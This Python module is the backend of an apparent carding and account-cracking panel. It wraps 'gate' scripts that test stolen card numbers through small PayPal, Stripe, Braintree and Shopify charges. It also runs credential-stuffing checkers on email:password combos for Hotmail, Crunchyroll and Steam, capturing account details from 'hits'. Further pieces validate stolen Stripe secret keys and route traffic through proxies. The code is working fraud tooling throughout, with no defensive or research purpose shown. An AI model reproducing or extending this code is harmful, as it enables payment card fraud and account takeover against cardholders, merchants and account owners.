"""
Script Wrappers for Real Checker Integration
This module provides wrapper functions to integrate existing checker scripts
"""

import sys
import os
from pathlib import Path
from typing import Dict, Optional, List
import asyncio
import datetime

# Add script directories to path
# Add script directories to path - PARENT DIRECTORY
# Current file is inbackend/script_wrappers.py
# Root is toji-project/
# Gates are in parent of toji-project/
PROJECT_ROOT = Path(__file__).parent.parent.parent  # Define paths to external scripts (2 levels up from backend)
PROJECT_ROOT = Path(__file__).parent.parent.parent
GATES_DIR = PROJECT_ROOT / "gates"
ACC_GATES_DIR = PROJECT_ROOT / "acc gates"
TOOLS_DIR = PROJECT_ROOT / "tools"

# DEBUG LOGGING
def log_debug(msg):
    try:
        with open("backend_debug_log.txt", "a", encoding="utf-8") as f:
            f.write(f"{datetime.datetime.now()} - {msg}\n")
    except:
        pass

# Add to sys.path
for dir_path in [GATES_DIR, ACC_GATES_DIR, TOOLS_DIR]:
    if str(dir_path) not in sys.path:
        sys.path.insert(0, str(dir_path))


# ============== PAYPAL CVV CHECKER ==============
async def check_paypal_cvv(card_line: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for PayPal CVV checker
    Uses: gates/paypal cvv 0.1$/paypalcvv (2).py
    """
    def _sync_check():
        log_debug(f"Starting PayPal CVV check for {card_line} (Proxy: {'Enabled' if proxy else 'None'})")
        try:
            # Add paypal cvv folder to path
            paypal_cvv_dir = GATES_DIR / "paypal cvv 0.1$"
            if str(paypal_cvv_dir) not in sys.path:
                sys.path.insert(0, str(paypal_cvv_dir))
            
            # Import the real function
            from paypalcvv import drgam  # type: ignore
            
            # Call real script with proxy
            result = drgam(card_line, proxy=proxy)
            log_debug(f"PayPal CVV Result for {card_line}: {result}")
            
            # Parse result
            if result == "Charge !":
                return {"status": "CHARGED", "message": "Payment Successful", "details": {}}
            elif "CVV" in str(result).upper():
                return {"status": "APPROVED", "message": result, "details": {"cvv": "failed"}}
            elif any(x in str(result).upper() for x in ["DECLINED", "HONOR", "CLOSED", "FRAUD", "FUNDS"]):
                return {"status": "DECLINED", "message": result, "details": {}}
            elif any(x in str(result).upper() for x in ["TIMEOUT", "SITE ERROR", "REGEX FAILURE", "CLOUDFLARE"]):
                return {"status": "ERROR", "message": result, "details": {}}
            else:
                # Catch-all for other messages from the script
                return {"status": "DECLINED", "message": result, "details": {}}
        except Exception as e:
            log_debug(f"PayPal CVV Exception for {card_line}: {str(e)}")
            return {"status": "ERROR", "message": str(e), "details": {}}

    try:
        # Add 60-second timeout
        return await asyncio.wait_for(asyncio.to_thread(_sync_check), timeout=60.0)
    except asyncio.TimeoutError:
        log_debug(f"PayPal CVV Timeout for {card_line}")
        return {"status": "ERROR", "message": "Timeout (60s)", "details": {}}


# ============== PAYPAL $0.1 CHECKER ==============
async def check_paypal_charge(card_line: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for PayPal $0.1 charge checker
    Uses: gates/paypal 0.1$/paypal checker.py
    """
    def _sync_check():
        try:
            # Add paypal folder to path
            paypal_dir = GATES_DIR / "paypal 0.1$"
            if str(paypal_dir) not in sys.path:
                sys.path.insert(0, str(paypal_dir))
            
            # Import and use
            from paypal_checker import PayPalProcessor  # type: ignore
            
            # Parse card
            parts = card_line.split('|')
            if len(parts) < 4:
                return {"status": "ERROR", "message": "Invalid card format"}
            
            cc, mm, yyyy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            
            # Process
            processor = PayPalProcessor()
            result = processor.process_payment(cc, mm, yyyy, cvv)
            
            return {
                "status": result.get("status", "ERROR"),
                "message": result.get("msg", "Unknown"),
                "details": {}
            }
        except Exception as e:
            return {"status": "ERROR", "message": str(e), "details": {}}

    try:
        return await asyncio.wait_for(asyncio.to_thread(_sync_check), timeout=30.0)
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Global Timeout (30s)"}


# ============== STRIPE SK CHECKER ==============
async def check_stripe_sk(card_line: str, sk_key: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for Stripe SK-based checker
    Uses: gates/sk bassed 1$/stripe_checker_fixed.py
    """
    async def _async_wrapper():
        log_debug(f"Starting Stripe SK check for {card_line} with sk_key {sk_key[:10]}...")
        try:
            # Add stripe sk folder to path
            stripe_sk_dir = GATES_DIR / "sk bassed 1$"
            if str(stripe_sk_dir) not in sys.path:
                sys.path.insert(0, str(stripe_sk_dir))
            
            # Import
            from stripe_checker_fixed import AdvancedStripeChecker, CardDetails  # type: ignore
            
            # Parse card
            parts = card_line.split('|')
            if len(parts) < 4:
                return {"status": "ERROR", "message": "Invalid card format"}
            
            cc, mm, yyyy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            
            # Create checker
            checker = AdvancedStripeChecker()
            checker.account = type('obj', (object,), {'sk': sk_key, 'pk': ''})()
            
            # Create card details
            card = CardDetails(
                number=cc,
                exp_month=mm,
                exp_year=yyyy if len(yyyy) == 4 else f"20{yyyy}",
                cvv=cvv
            )
            
            # Create session and check
            # Note: The checker itself is async, so we use it directly here
            # But we might need to wrap the setup parts if they are heavy
            session = await checker.create_session(proxy)
            
            # Create browser session
            checker.create_browser_session()
            
            # Validate SK first
            is_valid, _ = await checker.validate_sk(session, sk_key)
            if not is_valid:
                await session.aclose()
                return {"status": "ERROR", "message": "Invalid SK key"}
            
            # Extract PK
            pk = await checker.extract_pk(session)
            if not pk:
                await session.aclose()
                return {"status": "ERROR", "message": "Could not extract PK"}
            
            # Create token
            token_result = await checker.create_token(session, card)
            
            if not token_result.get("success"):
                await session.aclose()
                return {
                    "status": "DECLINED",
                    "message": token_result.get("error", "Token creation failed"),
                    "details": {}
                }
            
            # Test with setup intent ($0 auth)
            test_result = await checker.test_setupintent(session, token_result["token_id"], card)
            
            await session.aclose()
            
            if test_result.get("success"):
                status_val = test_result.get("status", "")
                if status_val == "succeeded":
                    return {"status": "APPROVED", "message": "Card Approved - CVV Matched", "details": {}}
                else:
                    return {"status": "LIVE", "message": f"Status: {status_val}", "details": {}}
            else:
                return {
                    "status": "DECLINED",
                    "message": test_result.get("error", "Declined"),
                    "details": {}
                }
            
        except Exception as e:
            return {"status": "ERROR", "message": str(e), "details": {}}

    # Since this function is already async internally, we can just call it
    # BUT if the imports/setup are slow, we might want to wrap. 
    # For now, let's keep it direct as it uses await properly
    try:
        return await asyncio.wait_for(_async_wrapper(), timeout=35.0)
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Global Timeout (35s)"}


# ============== BRAINTREE AUTO AUTH ==============
async def check_braintree(card_line: str, site_url: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for Braintree auto auth
    Uses: gates/braintree auto auth/main.py
    """
    async def _async_wrapper():
        log_debug(f"Starting Braintree check for {card_line} on {site_url}")
        try:
            # Add braintree folder to path
            braintree_dir = GATES_DIR / "braintree auth"
            if str(braintree_dir) not in sys.path:
                sys.path.insert(0, str(braintree_dir))
            
            # Import
            from main import BraintreeAutomatedChecker  # type: ignore
            
            # Create checker
            checker = BraintreeAutomatedChecker()
            
            # Check card (assuming this is sync in the original script)
            result = checker.check_card(site_url, card_line)
            
            # Parse result
            if "✅" in result or "APPROVED" in result.upper():
                return {"status": "APPROVED", "message": result, "details": {}}
            elif "LIVE" in result.upper():
                return {"status": "LIVE", "message": result, "details": {}}
            else:
                return {"status": "DECLINED", "message": result, "details": {}}
            
        except Exception as e:
            return {"status": "ERROR", "message": str(e), "details": {}}

    try:
        return await asyncio.wait_for(asyncio.to_thread(_async_wrapper), timeout=60.0)
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Global Timeout (60s)"}


# ============== STRIPE AUTO AUTH ==============
async def check_stripe_auth(card_line: str, site_url: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for Stripe auto auth
    Uses: gates/stripe auto auth/auto stripe auth.py
    """
    # This one seems async already based on await process_stripe_card
    # But let's wrap the import/setup 
    async def _async_wrapper():
        log_debug(f"Starting Stripe Auth check for {card_line} on {site_url}")
        try:
            # Add stripe auth folder to path
            stripe_auth_dir = GATES_DIR / "stripe auto auth"
            if str(stripe_auth_dir) not in sys.path:
                sys.path.insert(0, str(stripe_auth_dir))
            
            # Import
            from auto_stripe_auth import process_stripe_card, parse_card_data  # type: ignore
            
            # Parse card
            card_data = parse_card_data(card_line)
            if not card_data:
                return {"status": "ERROR", "message": "Invalid card format"}
            
            # Process - already async
            is_approved, response_msg = await process_stripe_card(site_url, card_data, auth_mode=1)
            
            if is_approved:
                return {"status": "APPROVED", "message": response_msg, "details": {}}
            else:
                return {"status": "DECLINED", "message": response_msg, "details": {}}
            
        except Exception as e:
            return {"status": "ERROR", "message": str(e), "details": {}}

    try:
        return await asyncio.wait_for(_async_wrapper(), timeout=60.0)
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Global Timeout (60s)"}


# ============== HOTMAIL CHECKER ==============
async def check_hotmail(combo: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for Hotmail/Microsoft account checker
    Uses: acc gates/microsoft/advanced_hotmail_checker.py
    """
    # This one is async already
    async def _async_wrapper():
        log_debug(f"Starting Hotmail check for {combo[:20]}...")
        try:
            # Add microsoft folder to path
            microsoft_dir = ACC_GATES_DIR / "microsoft"
            if str(microsoft_dir) not in sys.path:
                sys.path.insert(0, str(microsoft_dir))
            
            # Import
            from advanced_hotmail_checker import AdvancedHotmailChecker  # type: ignore
            
            # Parse combo
            if ':' not in combo:
                return {"status": "ERROR", "message": "Invalid format (email:password)"}
            
            email, password = combo.split(':', 1)
            
            # Create checker
            proxies = [proxy] if proxy else []
            checker = AdvancedHotmailChecker(proxies=proxies)
            
            # Check account
            result = await checker.check_account(email.strip(), password.strip())
            
            # Convert to API format
            if result.status == "SUCCESS":
                details = {
                    "name": result.name,
                    "country": result.country,
                    "unread_messages": result.unread_messages,
                    "payment_methods": result.payment_methods
                }
                return {"status": "HIT", "message": "Valid Account - Full Capture", "details": details}
            elif result.status == "2FACTOR":
                return {"status": "LIVE", "message": "2FA Required", "details": {}}
            else:
                return {"status": "DEAD", "message": result.error_message or "Invalid credentials", "details": {}}
            
        except Exception as e:
            return {"status": "ERROR", "message": str(e), "details": {}}

    try:
        return await asyncio.wait_for(_async_wrapper(), timeout=45.0)
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Global Timeout (45s)"}


# ============== SK KEY CHECKER ==============
async def check_sk_key(sk_key: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for SK key checker
    Uses: tools/sk chk/sk_checker_ chk key only.py
    """
    def _sync_check():
        try:
            # Add sk chk folder to path
            sk_chk_dir = TOOLS_DIR / "sk chk"
            if str(sk_chk_dir) not in sys.path:
                sys.path.insert(0, str(sk_chk_dir))
            
            # Import
            from sk_checker__chk_key_only import check_stripe_sk  # type: ignore
            
            # Check
            result = check_stripe_sk(sk_key)
            
            if result.get('success'):
                data = result['data']
                return {
                    "valid": True,
                    "message": "Valid SK Key",
                    "type": "LIVE" if data.get('is_live') else "TEST",
                    "balance": data.get('available', 0),
                    "currency": data.get('currency', 'USD'),
                    "country": data.get('country', 'N/A')
                }
            else:
                return {
                    "valid": False,
                    "message": result.get('error', 'Invalid key')
                }
        except Exception as e:
            return {"valid": False, "message": str(e)}

    try:
        return await asyncio.wait_for(asyncio.to_thread(_sync_check), timeout=25.0)
    except asyncio.TimeoutError:
        return {"valid": False, "message": "Global Timeout (25s)"}
# ============== SHOPIFY AUTO CHECKER ==============
async def check_shopify(card_line: str, shopify_url: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for Shopify auto checkout
    Uses: gates/shopify auto site/shopify_auto_checkout.py
    """
    # This one seems async (await checker.auto_shopify_charge)
    async def _async_wrapper():
        log_debug(f"Starting Shopify check for {card_line} on {shopify_url}")
        try:
            # Add shopify folder to path
            shopify_dir = GATES_DIR / "shopify auto site"
            if str(shopify_dir) not in sys.path:
                sys.path.insert(0, str(shopify_dir))
            
            # Import
            from shopify_auto_checkout import ShopifyAuto  # type: ignore
            
            # Create checker
            checker = ShopifyAuto()
            
            # Check card
            result_msg = await checker.auto_shopify_charge(shopify_url, card_line, proxy=proxy)
            
            # Parse result
            if "Charged" in result_msg or "Checkout Successful" in result_msg or "✅" in result_msg:
                return {"status": "CHARGED", "message": result_msg, "details": {}}
            elif "APPROVED" in result_msg.upper() or "Approved" in result_msg:
                return {"status": "APPROVED", "message": result_msg, "details": {}}
            else:
                return {"status": "DECLINED", "message": result_msg, "details": {}}
                
        except Exception as e:
            return {"status": "ERROR", "message": str(e), "details": {}}

    try:
        return await asyncio.wait_for(_async_wrapper(), timeout=60.0)
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Global Timeout (60s)"}


# ============== STRIPE AUTO HITTER ==============
async def check_stripe_hitter(card_line: str, checkout_url: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for Stripe auto hitter
    Uses: gates/STRIPE AUTO HITTER/STRIPE AUTO HITTER.py
    """
    # This one looks synchronous (StripeCheckoutProcessor)
    def _sync_wrapper():
        log_debug(f"Starting Stripe Hitter check for {card_line} on {checkout_url}")
        try:
            # Add stripe hitter folder to path
            stripe_hitter_dir = GATES_DIR / "STRIPE AUTO HITTER"
            if str(stripe_hitter_dir) not in sys.path:
                sys.path.insert(0, str(stripe_hitter_dir))
            
            # Import
            from STRIPE_AUTO_HITTER import StripeCheckoutProcessor  # type: ignore
            
            # Parse card
            parts = card_line.split('|')
            if len(parts) < 4:
                return {"status": "ERROR", "message": "Invalid card format"}
            
            card_details = {
                'number': parts[0].strip(),
                'exp_month': parts[1].strip().zfill(2),
                'exp_year': parts[2].strip() if len(parts[2].strip()) == 4 else f"20{parts[2].strip()}",
                'cvc': parts[3].strip()
            }
            
            # Create processor
            processor = StripeCheckoutProcessor()
            
            # Extract PK/CS
            pk, cs = processor.extract_from_api(checkout_url)
            if not (pk and cs):
                # Try manual extraction
                # Note: This uses 'requests' internally, might need proxy handling if we wanted to be thorough
                success = processor.manual_extract_from_url(checkout_url)
                if not success:
                    return {"status": "ERROR", "message": "Failed to extract Stripe keys from URL"}
            
            # Request 1: Create payment method
            resp1 = processor.make_request_1(card_details)
            if not resp1 or 'id' not in resp1:
                return {"status": "DECLINED", "message": "Failed to create payment method", "details": {}}
            
            pm_id = resp1['id']
            
            # Request 2: Confirm payment
            # Note: We need an amount. The script tries to extract it or asks via input.
            # We'll use the extracted amount or default to a common one if missing.
            if not processor.extracted_values.get('expected_amount'):
                 processor.extracted_values['expected_amount'] = "100" # Default 100 cents
                 
            resp2 = processor.make_request_2(pm_id)
            
            if not resp2:
                return {"status": "ERROR", "message": "Payment confirmation failed", "details": {}}
                
            status = resp2.get('status', 'failed')
            if status in ['succeeded', 'processing', 'requires_capture']:
                return {"status": "CHARGED", "message": f"Payment {status.upper()}", "details": {"pm_id": pm_id}}
            elif status == 'requires_action':
                return {"status": "LIVE", "message": "3D Secure Required", "details": {"pm_id": pm_id}}
            else:
                error_msg = resp2.get('error', {}).get('message', 'Declined')
                return {"status": "DECLINED", "message": error_msg, "details": {}}
                
        except Exception as e:
            return {"status": "ERROR", "message": str(e), "details": {}}

    try:
        return await asyncio.wait_for(asyncio.to_thread(_sync_wrapper), timeout=45.0)
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Global Timeout (45s)"}


# ============== CRUNCHYROLL CHECKER ==============
async def check_crunchyroll(combo: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for Crunchyroll checker
    Uses: acc gates/crunchyroll api based/crunchyroll_checekr.py
    """
    # Crunchroll seems synchronous based on imports previously seen
    def _sync_wrapper():
        log_debug(f"Starting Crunchyroll check for {combo[:20]}...")
        try:
            # Add crunchyroll folder to path
            crunchy_dir = ACC_GATES_DIR / "crunchyroll api based"
            if str(crunchy_dir) not in sys.path:
                sys.path.insert(0, str(crunchy_dir))
            
            # Import
            from crunchyroll_checekr import check_account  # type: ignore
            
            # Parse combo
            if ':' not in combo:
                return {"status": "ERROR", "message": "Invalid format (email:password)"}
            
            email, password = combo.split(':', 1)
            
            # Note: crunchyroll_checekr uses global USE_PROXY and proxies_list
            # We might need to mock or set them if we want proxy support
            # For now, let's call it. It uses 'requests' internally.
            
            result = check_account(email.strip(), password.strip(), silent=True)
            
            if result['status'] in ['premium', 'hit']:
                return {"status": "HIT", "message": "Premium Account!", "details": result.get('captures', {})}
            elif result['status'] == 'free':
                return {"status": "LIVE", "message": "Free Account", "details": result.get('captures', {})}
            elif result['status'] == 'expired':
                return {"status": "LIVE", "message": "Expired Premium", "details": result.get('captures', {})}
            elif result['status'] == 'failed':
                return {"status": "DEAD", "message": "Invalid Credentials", "details": {}}
            else:
                return {"status": "ERROR", "message": result.get('message', 'Unknown error'), "details": {}}
                
        except Exception as e:
            return {"status": "ERROR", "message": str(e), "details": {}}

    try:
        return await asyncio.wait_for(asyncio.to_thread(_sync_wrapper), timeout=30.0)
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Global Timeout (30s)"}


# ============== STEAM CHECKER ==============
async def check_steam(combo: str, proxy: Optional[str] = None) -> Dict:
    """
    Wrapper for Steam checker
    Uses: acc gates/steam/steam_checker.py
    """
    # Steam is synchronous
    def _sync_wrapper():
        log_debug(f"Starting Steam check for {combo[:20]}...")
        try:
            # Add steam folder to path
            steam_dir = ACC_GATES_DIR / "steam"
            if str(steam_dir) not in sys.path:
                sys.path.insert(0, str(steam_dir))
            
            # Import
            from steam_checker import process_combo  # type: ignore
            
            # Proxies list
            proxies = [proxy] if proxy else []
            
            # Note: process_combo is synchronous
            status, info = process_combo(combo, proxies)
            
            if status in ['HIT_CUSTOM', 'HIT_FREE']:
                return {"status": "HIT", "message": info, "details": {}}
            elif status == 'FAIL':
                if "Login failed" in info or "Invalid credentials" in info:
                    return {"status": "DEAD", "message": info, "details": {}}
                else:
                    return {"status": "ERROR", "message": info, "details": {}}
            elif status == 'RETRY':
                return {"status": "ERROR", "message": f"Retry needed: {info}", "details": {}}
            else:
                return {"status": "DEAD", "message": info, "details": {}}
                
        except Exception as e:
            return {"status": "ERROR", "message": str(e), "details": {}}

    try:
        return await asyncio.wait_for(asyncio.to_thread(_sync_wrapper), timeout=30.0)
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "Global Timeout (30s)"}


# ============== SITE GATE CHECKER ==============
async def check_site_gate(url: str) -> Dict:
    """
    Wrapper for Site Gate & Technology Checker
    Uses: tools/site gate chk/main.py
    """
    try:
        # Add site gate folder to path
        site_gate_dir = TOOLS_DIR / "site gate chk"
        if str(site_gate_dir) not in sys.path:
            sys.path.insert(0, str(site_gate_dir))
        
        # Import
        from main import AdvancedSiteChecker  # type: ignore
        
        # Create checker
        checker = AdvancedSiteChecker()
        
        # Validate URL
        is_safe, msg = checker.is_safe_url(url)
        if not is_safe:
            return {"status": "ERROR", "message": msg}
        
        # Perform check (wrapped in thread because it's sync)
        def _sync_check():
            try:
                # Capture result
                result = checker.analyze_site(url)
                return {"status": "SUCCESS", "data": result}
            except Exception as e:
                return {"status": "ERROR", "message": str(e)}
                
        return await asyncio.to_thread(_sync_check)
        
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}


# ============== ADVANCED PROXY CHECKER ==============
async def check_proxy_advanced(proxy_string: str) -> Dict:
    """
    Wrapper for Advanced Proxy Checker
    Uses: tools/proxy_checker.py
    """
    try:
        # Import
        from proxy_checker import check_proxy as real_check  # type: ignore
        
        # Call the checker
        result = await real_check(proxy_string)
        return result
        
    except Exception as e:
        return {"success": False, "proxy": proxy_string, "message": str(e)}
